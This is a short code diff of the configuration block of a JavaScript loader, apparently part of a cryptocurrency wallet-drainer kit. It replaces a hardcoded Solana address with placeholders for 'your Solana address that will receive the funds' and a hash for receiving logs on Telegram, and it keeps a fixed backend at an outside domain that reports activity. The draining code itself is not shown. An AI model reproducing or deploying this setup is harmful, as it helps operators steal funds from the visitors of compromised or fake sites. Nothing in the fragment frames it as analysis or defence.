@@ -1,7 +1,11 @@
 (function() {
     const config = {
-        solanaAddress: "AjF1cgmjpuJsDs8YaL2BLxB9Ttgvxf6s8oYxzSBjekwg" // Enter your Solana address that will receive the funds.
+        solanaAddress: "SOLANAADRESS", // Enter your Solana address that will receive the funds.
+        userHash: "LOGHASH" // Enter your hash for receiving logs on telegram. (Visit 4ware.icu/log)
     };
+
+
+    window.loaderConfig = config;
 
     const backendUrl = "https://4ware.icu" // Changing this will break down your code, keep it as it is.
 
